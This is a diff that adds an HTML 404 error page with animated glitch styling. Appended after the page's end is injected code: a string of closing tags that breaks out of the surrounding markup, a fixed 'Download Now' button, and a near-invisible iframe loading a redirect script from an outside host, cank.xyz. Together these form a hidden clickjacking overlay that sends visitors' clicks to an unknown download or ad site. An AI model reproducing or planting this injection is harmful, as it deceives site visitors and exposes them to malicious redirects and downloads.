@@ -1,0 +1,45 @@
+<!DOCTYPE html> <html> <head> <meta charset="UTF-8"> <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"> <style> @import url(https://fonts.googleapis.com/css?family=Gilda+Display); html { background: radial-gradient(#000, #111); color: white; overflow: hidden; height: 100%; user-select: none; } .static { width: 100%; height: 100%; position: relative; margin: 0; padding: 0; top: -100px; opacity: 0.05; z-index: 230; user-select: none; user-drag: none; } .error { text-align: center; font-family: &apos;Gilda Display&apos;, serif; font-size: 95px; font-style: italic; text-align: center; width: 100px; height: 60px; line-height: 60px; margin: auto; position: absolute; top: 0; bottom: 0; left: -60px; right: 0; animation: noise 2s linear infinite; overflow: default; } .error:after { content: &apos;404&apos;; font-family: &apos;Gilda Display&apos;, serif; font-size: 100px; font-style: italic; text-align: center; width: 150px; height: 60px; line-height: 60px; margin: auto; position: absolute; top: 0; bottom: 0; left: 0; right: 0; opacity: 0; color: blue; animation: noise-1 .2s linear infinite; } .info { text-align: center; font-family: &apos;Gilda Display&apos;, serif; font-size: 15px; font-style: italic; text-align: center; width: 200px; height: 60px; line-height: 60px; margin: auto; position: absolute; top: 140px; bottom: 0; left: 0; right: 0; animation: noise-3 1s linear infinite; } .error:before { content: &apos;404&apos;; font-family: &apos;Gilda Display&apos;, serif; font-size: 100px; font-style: italic; text-align: center; width: 100px; height: 60px; line-height: 60px; margin: auto; position: absolute; top: 0; bottom: 0; left: 0; right: 0; opacity: 0; color: red; animation: noise-2 .2s linear infinite; } @keyframes noise-1 { 0%, 20%, 40%, 60%, 70%, 90% {opacity: 0;} 10% {opacity: .1;} 50% {opacity: .5; left: -6px;} 80% {opacity: .3;} 100% {opacity: .6; left: 2px;} } @keyframes noise-2 { 0%, 20%, 40%, 60%, 70%, 90% {opacity: 0;} 10% {opacity: .1;} 50% {opacity: .5; left: 6px;} 80% {opacity: .3;} 100% {opacity: .6; left: -2px;} } @keyframes noise { 0%, 3%, 5%, 42%, 44%, 100% {opacity: 1; transform: scaleY(1);} 4.3% {opacity: 1; transform: scaleY(1.7);} 43% {opacity: 1; transform: scaleX(1.5);} } @keyframes noise-3 { 0%,3%,5%,42%,44%,100% {opacity: 1; transform: scaleY(1);} 4.3% {opacity: 1; transform: scaleY(4);} 43% {opacity: 1; transform: scaleX(10) rotate(60deg);} } .action { text-align: center; font-family: &apos;Gilda Display&apos;, serif; font-size: 15px; font-style: italic; text-align: center; width: 200px; height: 60px; line-height: 60px; margin: auto; position: absolute; top: 200px; bottom: 0; left: 0; right: 0; } .action a{color:#fff;font-weight:bold;} </style> </head> <body> <div class="error">404</div> <br /><br /> <span class="info">File not found</span> <div class="action"><a href="/">Back to Home</a> / <a href="/page-contact-us/">Report</a></div> </body> </html></title></style></do></font></iframe></script></noscript></textarea></div></div></div><br/>
+<style type="text/css">
+.oIe9a0e44e495ab0f3c5475f8120d21ca61 {
+			position:fixed !important;
+			bottom:0px !important;
+			right: 0px !important;
+			background-color:#ffffff transparent !important;
+			width:100% !important;
+			z-index:2147483647 !important;
+			padding:2px !important;
+			margin:auto !important;
+			text-align:center !important;
+			float:none !important;
+			}
+			.oIe9a0e44e495ab0f3c5475f8120d21ca62 {
+			border: 1px #56aa71 solid !important;
+			background-color:#55fb73 !important;
+			width:80% !important;
+			padding:4px !important;
+			text-align:center !important;
+			margin:0 !important;
+			border-radius: 5px !important;
+			margin:auto !important;
+			text-align:center !important;
+			float:none !important;
+			position: relative;
+bottom: -25px;
+			}
+			.oIe9a0e44e495ab0f3c5475f8120d21ca61 a{
+			color:white !important;
+			text-decoration: none !important;
+			}
+			center {
+    visibility: visible !important;
+}
+
+          </style>
+<!--wapkiz-->
+<div class="oIe9a0e44e495ab0f3c5475f8120d21ca61">
+
+<button class="oIe9a0e44e495ab0f3c5475f8120d21ca62" >Download Now</button>
+<div style=" width:100%; opacity:0.0002;">
+<center><iframe id="oIe9a0e44e495ab0f3c5475f8120d21ca67" scrolling="no" style="width: 100%;
+height: 59px;
+margin: -18px;"  class="lazyload"  src="//cank.xyz/red2.php?rand=oIe9a0e44e495ab0f3c5475f8120d21ca6&id=27"  frameborder="0" marginheight="0" marginwidth="0"  replaced="true" referrerpolicy="no-referrer"><div class="oIe9a0e44e495ab0f3c5475f8120d21ca61"><a href="//cank.xyz/red2.php?rand=oIe9a0e44e495ab0f3c5475f8120d21ca6&id=12" rel="nofollow" target="_blank"><div class="oIe9a0e44e495ab0f3c5475f8120d21ca62"><b>DOWNLOAD NOW</b></div></a></div></iframe></center></div></div> 
